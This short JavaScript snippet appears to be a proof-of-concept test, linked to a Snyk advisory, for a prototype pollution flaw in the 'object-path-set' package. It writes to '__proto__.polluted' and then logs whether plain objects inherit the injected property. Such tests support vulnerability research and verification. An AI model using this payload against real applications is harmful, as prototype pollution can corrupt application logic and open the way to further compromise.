// //https://snyk.io/vuln/SNYK-JS-OBJECTPATH-1017036
// test("prototype pollution in object-path-set ", () => {
  const setPath = require("object-path-set");
  var obj = {};

console.log({}.polluted);

  setPath({}, "__proto__.polluted", "yes");
console.log("{ " + obj.polluted + ", " + "yes" + " }");
// });
